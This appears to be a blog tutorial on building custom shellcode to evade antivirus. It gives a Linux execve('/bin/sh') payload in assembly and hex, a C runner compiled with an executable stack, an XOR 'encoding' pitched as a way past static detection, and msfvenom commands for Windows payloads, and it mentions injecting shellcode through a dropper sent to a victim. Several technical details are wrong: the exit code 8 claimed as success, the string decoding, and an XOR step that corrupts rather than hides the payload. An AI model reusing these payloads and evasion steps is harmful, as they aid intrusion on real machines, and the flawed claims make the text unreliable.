---
layout: post
title: "AV Evasion Techniques Part 2: Create Custom Shellcode from Scratch"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

**A Simple Shellcode!**

In order to craft your own shellcode, a set of skills is required:

· A decent understanding of x86 and x64 CPU architectures

· Assembly language

· Strong knowledge of programming languages such as C

· Familiarity with the Linux and windows operating systems.

To generate our shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will create a simple shellcode for Linux that writes the string “This, Rocks”. The following assembly code uses two main functions:

· System Write function (**sys\_write**) to print out a string we choose.

· System Exit function (**sys\_exit**) to terminate the execution of the program.

To call those functions, will use **syscalls**. A syscall is in which a program requests the kernel to do something, in this case, we will request the kernel to write a string to our screen, and exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you’ll probably use a different syscall than the one you’d use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values:

![](https://cdn-images-1.medium.com/max/800/1*ixK2CPv0BLvJmNT2Cn94BA.png)

You can also find an online searchable table here: [https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/)

The table above tells us what values we need to set in different processor registers to call the **sys\_write and sys\_exit** functions using **syscalls**. For 64-bits Linux, the **rax** register is used to **indicate the function in the kernel we wish to call.** Setting **rax** **to 0x1** makes the kernel **execute** **sys\_write,** and setting **rax** to **0x3c** will make the kernel execute **sys\_exit**. Each of the two functions require some **parameters** to work, which can be set through the **rdi, rsi and rdx registers.** You can find a complete reference of available 64-bits Linux **syscalls**.

For **sys\_write** the first parameter sent through **rdi** is the **file descriptor** to write to and the **second** parameter in **rsi** is a pointer to the string we want to print, the third in **rdx** is the **size of the string to print.**

For **sys\_exit,** **rdi** needs to be set to the exit code for the program. We will use the code 8, which means the program exited successfully.

![](https://cdn-images-1.medium.com/max/800/1*rYLNc4CnaBQfGNPN1Ty2yA.png)

Let’s explain the ASM code a bit more. First, our message string is stored at the end of the **.text** section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself, when **call** **GOBACK** executed, the address of the next instruction after call will be pushed into the stack, which corresponds to **where** our message is. Note that the **Odh, Oah** at the end of the message is the binary equivalent to a **new line** **(\\r\\n**).

Next, the program starts the **GOBACK** routine and prepares the required registers for our first **sys\_write() function.**

· We specify the **sys\_write function by storing 1 in the rax register**

· We set **rdi to 1** to print out the string to the user’s console (**STDOUT**)

· We pop a pointer to our string, which was pushed when we called **GOBACK** and store it into **rsi**. With the **syscall** instruction, we execute the **sys\_write** function with the values we prepared.

· For the next part, we do the same to call the **sys\_exit function**, so we set **0x3c** into the **rax** register and call the **syscall** function to exit the program

Next, we compile and link the AS code to create an x64 Linux executable file and Finally execute the program.

> **nasm –f elf64 thm.asm**

> **ld thm.o –O thm**

> **./thm**

We used the **nasm** command to compile the file, specifying the **–f elf64** option to indicate that we are compiling for 64-bits Linux. Notice that as a result we obtain a **.o File**, which contains **object code**, which needs to be linked in order to be a working executable file. The **ld** command is used **to link the object and obtain the Final executable**.

let’s extract the shellcode with the **objdump** command by dumping the **.text** section of the compiled binary.

> **Objdump –d thm**

Now we need to extract the hex value from the above output. to do that, we can use **objcopy** to dump the .text section into a new file called **thm.text** in **a binary format** as follows**:**

> **objcopy –j .text –O binary thm thm.text**

The **thm.text** contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex First. The **xxd** command has the **–i** option that will output the binary file in a C string directly.

> **xxd –i thm.text**

Finally, we have it a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work

To confirm that the extracted shellcode works well as we expected, we can execute our shellcode and inject it into a C program.

![](https://cdn-images-1.medium.com/max/800/1*pRCGkU26mjGFPt5g8A5UKw.png)

### Write the Shellcode in Assembly

#### Example: Linux x86 Shellcode to Execute `/bin/sh`

Here’s how to manually write shellcode in Assembly:

1\. **Use System Calls**: Shellcode interacts with the kernel directly using system calls. For Linux:

- The `execve` system call is used to execute `/bin/sh`**.**
- System call numbers are architecture-specific. For x86 Linux:
- `execve` **=** `0x0b`**.**
- Registers are used to pass arguments: `eax`**,** `ebx`**,** `ecx`**,** etc.

2\. **Minimize Null Bytes**: Null bytes (`\x00`) terminate strings and can break shellcode when injected into a buffer. Avoid them where possible.

### Removing NULLs

We need to extract these bytes and use them in our C code! Simple? BUT WAIT!

Another fundamental we know is that null bytes can sometimes terminate an action. So we must remove these null bytes from our shellcode to prevent any mishappening. To exactly know which instructions won’t generate null bytes comes with practice. But certain tricks can be used in simple programs to achieve this.

For example, using “**xor rax,rax**” would assign **rax=0** since **xoring** anything with itself gives **0**.

So, we can do “**xor rax,rax**” and then “**add rax,1**” to make **RAX** as **1.**

In our code, you’ll observe every **mov** instruction creates **0s**. So, if we have to assign a value of “**1**”, we can **xor** to make it **0** and then “**add**” 1. “Add” instruction simply adds the value given to the register mentioned.

```
section .text
global _start

_start:
xor eax, eax        ; Clear eax (set it to 0)
push eax            ; Null-terminate the string "/bin/sh"
push 0x68732f6e     ; Push "/bin/sh" string in reverse order
push 0x69622f2f     ; Push "//bin"
mov ebx, esp        ; Set ebx to point to "/bin/sh"
xor ecx, ecx        ; Null out ecx (no arguments to the shell)
xor edx, edx        ; Null out edx (no environment variables)
mov al, 0x0b        ; Syscall number for execve
int 0x80            ; Trigger syscall
```

### Code Analysis

```
_start:
xor eax, eax        ; Clear eax (set it to 0)Explanation:
```

- This clears the `EAX` register by performing an XOR operation between itself.
- `EAX` is often used to hold system call numbers, so starting with a clean slate is crucial.
- The result is `EAX = 0`.

```
push eax            ; Null-terminate the string "/bin/sh"
```

- **Explanation:**
- `EAX` (which is now 0) is pushed onto the stack.
- This null-byte acts as a string terminator, required in C-style strings.

```
push 0x68732f6e     ; Push "/bin/sh" string in reverse order
```

- **Explanation:**
- The string `"/bin/sh"` is written in reverse order **(**`\n/sh`) because the stack is a *Last-In-First-Out* (LIFO) structure.
- The hexadecimal representation of the ASCII characters for `/bin/sh` is `0x68732f6e`**.**

```
push 0x69622f2f     ; Push "//bin"
```

### 1. Forming the Complete `/bin/sh` String

· **Why** `//bin`**?**

- The shellcode forms the `/bin/sh` string by first pushing `//bin` (hex: `0x69622f2f`) and then `\n/sh` (hex: `0x68732f6e`) onto the stack in reverse order.
- Together, they concatenate into `//bin/sh` when the stack is read sequentially in memory.

**Why** `//`**?**

- The double slash **(**`//`**)** is a valid path in Unix-like systems. For instance**,** `/bin/sh` and `//bin/sh` resolve to the same file in Linux. This is because multiple slashes are treated as a single slash in Unix path parsing.

### 2. Ensuring Proper Memory Alignment

· **Memory Alignment and Word Boundaries:**

- The CPU prefers data to be aligned to word boundaries (e.g., 4 bytes on x86 systems).
- Using `//bin` ensures that the data length is a multiple of **4 bytes**, making the string properly aligned in memory.
- Misaligned data can lead to slower access or issues when processing on certain architectures.

· **Avoiding Null Bytes:**

- In shellcode, null bytes **(**`\x00`) are avoided because they act as string terminators in many programming contexts, potentially breaking the payload.
- Using `//bin` ensures no null bytes are introduced while maintaining alignment.

### Visualizing the Stack:

After the `push` operations, the stack (from top to bottom) contains:

**Address — Value — Explanation**

**ESP —** `0x00000000` **— Null terminator**

**ESP+4 —** `0x68732f6e` **—** `\n/sh` **(reversed)**

**ESP+8 —** `0x69622f2f` **—** `//bin` **(reversed)**

When combined, this forms the null-terminated string `//bin/sh`

```
mov ebx, esp        ; Set ebx to point to "/bin/sh"
```

- **Explanation:**
- `ESP` (Stack Pointer) currently points to the top of the stack, which contains the null-terminated string `"/bin/sh"`.
- The `EBX` register is used to hold the address of the filename to execute (in this case, `/bin/sh`).

```
xor ecx, ecx        ; Null out ecx (no arguments to the shell) 
xor edx, edx        ; Null out edx (no environment variables)
```

- `ECX` and `EDX` are set to 0.
- `ECX` holds the address of the arguments array (`argv`), and since there are no arguments, it is set to null.
- `EDX` holds the address of the environment variables array (`envp`), which is also null.

`mov al, 0x0b ; Syscall number for execve`

- **Explanation:**
- The system call number for `execve` in Linux x86 is `0x0b` (decimal 11).
- The `AL` register (lower 8 bits of `EAX`) is set to this value.

```
int 0x80            ; Trigger syscall
```

- **Explanation:**
- `int 0x80` triggers a software interrupt to switch the processor to kernel mode.
- The kernel reads the **syscall** number from `EAX` and the parameters (`EBX`**,** `ECX`**, and** `EDX`) to execute the `execve` system call.

### How the System Call Works

The `execve` **syscall** is invoked with three parameters:

1. **Filename (**`EBX`**):** A pointer to the string `"/bin/sh"`.
2. **Arguments (**`ECX`**):** A **null** pointer (`0`) as no arguments are passed.
3. **Environment (**`EDX`**):** A null pointer (`0`) as no environment variables are passed.

When this syscall executes successfully, it replaces the current process with a new shell **(**`/bin/sh`), effectively giving the attacker control over the machine.

### Example Opcodes (Hexadecimal Shellcode)

The assembled shellcode (binary representation) of the above assembly might look like:

```
31 c0 50 68 6e 2f 73 68 68 2f 2f 62 69 89 e3 31 c9 31 d2 b0 0b cd 80
```

### 4. Assemble and Convert to Shellcode

1\. **Assemble the Code**: Use `nasm` to assemble the code:

```
nasm -f elf32 shellcode.asm -o shellcode.o
```

2\. **Link the Object File**:

```
ld -m elf_i386 shellcode.o -o shellcode
```

3\. **Extract Opcodes**: Disassemble the binary to get the opcodes (hexadecimal representation of the Assembly instructions):

```
objdump -d shellcode | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 | tr -s ' ' | cut -d' ' -f2- | tr -d '\n'
```

**Result**:

```
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

### 5. Embed and Test the Shellcode

Embed the shellcode in a simple C program for testing:

```
#include <stdio.h>
#include <string.h>
unsigned char shellcode[] =
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main() {
printf("Shellcode length: %d\n", strlen(shellcode));
void (*exec)() = (void(*)())shellcode;
exec();
return 0;
}
```

Compile and test the program:

```
gcc -m32 -fno-stack-protector -z execstack shellcode_test.c -o shellcode_test
```

### 6. Write Unique and Custom Shellcode

To evade antivirus:

- **Obfuscate Instructions**: Use techniques like XOR encoding to hide the shellcode.
- **Inline Decoding**: Add decoding logic in the shellcode to decrypt itself at runtime.

Example (simple XOR encoding):

```
section .text
global _start
_start:
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f

; XOR-encoded "/bin/sh" with key 0xAA
xor byte [esp], 0xAA
xor byte [esp+1], 0xAA
xor byte [esp+2], 0xAA
xor byte [esp+3], 0xAA
xor byte [esp+4], 0xAA
xor byte [esp+5], 0xAA
xor byte [esp+6], 0xAA

mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0x0b
int 0x80
```

This technique reduces the likelihood of static detection since the shellcode is obfuscated.

**Generate Shellcode**

in this task continue working with shellcode demonstrate to generate and execute shellcode using public tools such as the **Metasploit** framework.

**Generate shellcode using Public Tools**

Shellcode can be generated for a specific format with a particular programming language. This depends on you. For example, if your **dropper**, which is **the main exe File**, contains the shellcode that will be sent to a victim, and is written in C, then we need to generate a shellcode format that works in C.

The advantage of generating shellcode via public tools is that we don’t need to craft a custom shellcode from scratch, and we don’t even need to be an expert in assembly language. Most public C2 frameworks provide their own shellcode generator compatible with the C2 platform. Of course, the drawback is that most, or we can say all, generated shellcodes are well-known to ay vendors and can be easily detected. convenient for

We will be creating a shellcode that runs the **calc.exe** application.

> **Msfvenom –a x86 –platform windows –p windows/exec cmd=calc.exe –f c**

**Shellcode injection**

Hackers inject shellcode into a running or new thread and process using various techniques. Shellcode injection techniques modify the program’s execution flow to update registers and functions of the program to execute the attacker’s own code.

Now let’s continue using the generated shellcode and execute it on the operating system. The following is a C code containing our generated shellcode which will be injected into memory and will execute “calc.exe”.

![](https://cdn-images-1.medium.com/max/800/1*sURgE2RuOAyGE4cNhLmt9Q.png)

**Generate Shellcode from EXE files**

Shellcode can also be stored in **.bin** files, which is a **raw** data format, in this case, we can get the shellcode of it using the **xxd –i** command.

C2 Frameworks provide shellcode as a raw binary file **.bin**. if this is the case, we can use the **xxd** Linux system command to get the **hex** representation of the

To do so, we execute the following command: **xxd –i** .

> **Msfvenom –a x86 –platform windows –p windows/exec cmd=calc.exe –f raw /tmp/example.bin**

> **xxd –i /tmp/example.bin**

By [Moataz Osama](https://medium.com/@mezo512) on [January 30, 2025](https://medium.com/p/abde144b70f0).

[Canonical link](https://medium.com/@mezo512/av-evasion-techniques-part-2-create-custom-shellcode-from-scratch-abde144b70f0)

Exported from [Medium](https://medium.com) on August 26, 2025.